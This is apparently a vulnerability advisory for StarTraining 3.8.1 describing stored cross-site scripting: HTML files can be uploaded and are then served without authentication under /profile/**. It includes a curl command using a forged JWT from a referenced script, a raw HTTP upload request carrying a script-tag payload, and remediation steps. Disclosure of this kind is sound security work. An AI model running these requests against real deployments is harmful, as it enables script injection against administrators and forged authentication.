# StarTraining — HTML upload allowed and /profile/** served anonymously (stored XSS) (ST-VULN-006)

| Field | Value |
|-------|-------|
| Vendor | zhistaredu |
| Product | StarTraining |
| Version | 3.8.1 |
| Type | Cross Site Scripting |
| CWE | CWE-434 / CWE-79 |
| Authentication | Authenticated user with upload permission |
| Severity | High |

## Summary

`MimeTypeUtils.DEFAULT_ALLOWED_EXTENSION` includes html/htm. Uploaded files are served under `/profile/**` with permitAll GET.

## Root cause

Dangerous upload extensions + public static resource mapping.

## Exploit / reproduction

Upload HTML, then open the returned `/profile/...` URL anonymously.

```bash
TOK=$(python3 startraining_jwt_forge.py)
curl -s -X POST 'http://127.0.0.1:8900/common/upload' -H "Authorization: $TOK" \
  -F 'file=@poc.html;type=text/html'
# Use url / fileName from the JSON response
```

Example direct link (UUID changes per upload):

- `http://127.0.0.1:8900/profile/upload/2026/08/03/d71ce54a-955f-4057-91dc-35050caed149.html`

Anonymous static prefix: `http://127.0.0.1:8900/profile/**`


## PoC (Yakit)

```http
POST /common/upload HTTP/1.1
Host: 127.0.0.1:8900
Authorization: USER_TOKEN
Content-Type: multipart/form-data; boundary=----BOUNDARY
Connection: close

------BOUNDARY
Content-Disposition: form-data; name="file"; filename="poc.html"
Content-Type: text/html

<script>alert('ST-PoC')</script>
------BOUNDARY--

# Then open returned /profile/upload/.../poc.html without auth
```

Expected: Upload returns profile URL; GET executes script in browser

## Screenshots

![upload](./screenshots/ST-VULN-006-upload.png)

![xss](./screenshots/ST-VULN-006-xss.png)

## Impact

Stored XSS against admins viewing uploaded resources.

## Remediation

Remove html from allowed extensions; require auth on /profile/**; enable XSS filter.

## References

- Local report: `../POC_VERIFICATION_REPORT.md`
- Scripts: `poc_verify/startraining_poc_verify.py`, `startraining_jwt_forge.py`
